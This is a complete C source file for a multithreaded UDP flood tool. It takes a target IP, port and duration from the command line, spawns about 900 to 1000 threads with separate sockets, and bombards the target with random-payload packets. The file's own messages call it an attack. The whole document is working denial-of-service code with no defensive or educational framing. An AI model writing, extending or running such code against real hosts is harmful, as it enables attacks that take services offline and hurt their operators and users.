#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
    int sock;
} attack_params;

// Global variables
volatile int keep_running = 1;

// Signal handler to stop the attack
void handle_signal(int signal) {
    keep_running = 0;
}

// Function to generate a random payload
void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = rand() % 256;  // Random byte between 0 and 255
    }
}

int get_random_source_port() {
    return (rand() % (65535 - 1024 + 1)) + 1024;
}

int setup_udp_socket() {
    int sock;
    struct sockaddr_in source_addr;

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return -1;
    }

    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    int attempts = 10;
    while (attempts--) {
        memset(&source_addr, 0, sizeof(source_addr));
        source_addr.sin_family = AF_INET;
        source_addr.sin_port = htons(get_random_source_port());
        source_addr.sin_addr.s_addr = INADDR_ANY;

        if (bind(sock, (struct sockaddr *)&source_addr, sizeof(source_addr)) == 0) {
            return sock;
        }
    }

    perror("Failed to bind after multiple attempts");
    close(sock);
    return -1;
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    struct sockaddr_in server_addr;
    char *message;

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    if (server_addr.sin_addr.s_addr == INADDR_NONE) {
        fprintf(stderr, "Invalid IP address.\n");
        return NULL;
    }

    message = (char *)malloc(params->packet_size);
    if (!message) {
        perror("Memory allocation failed");
        return NULL;
    }
    generate_random_payload(message, params->packet_size);

    time_t end_time = time(NULL) + params->duration;
    while (time(NULL) < end_time && keep_running) {
        sendto(params->sock, message, params->packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    free(message);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s [ip] [port] [duration]\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    srand(time(NULL));
    int packet_size = (rand() % 1001) + 500;
    int thread_count = (rand() % 101) + 900;

    signal(SIGINT, handle_signal);

    pthread_t threads[thread_count];
    attack_params params[thread_count];

    printf("Starting UDP flood: %s:%d for %d seconds\n", target_ip, target_port, duration);
    printf("Using packet size: %d bytes | Threads: %d\n", packet_size, thread_count);

    // Create one socket per thread to avoid conflicts
    for (int i = 0; i < thread_count; i++) {
        int sock = setup_udp_socket();
        if (sock < 0) {
            fprintf(stderr, "Failed to create socket for thread %d\n", i);
            return EXIT_FAILURE;
        }

        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;
        params[i].sock = sock;

        if (pthread_create(&threads[i], NULL, udp_flood, &params[i]) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
        }
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
        close(params[i].sock);
    }

    printf("Attack finished. All threads stopped.\n");
    return EXIT_SUCCESS;
}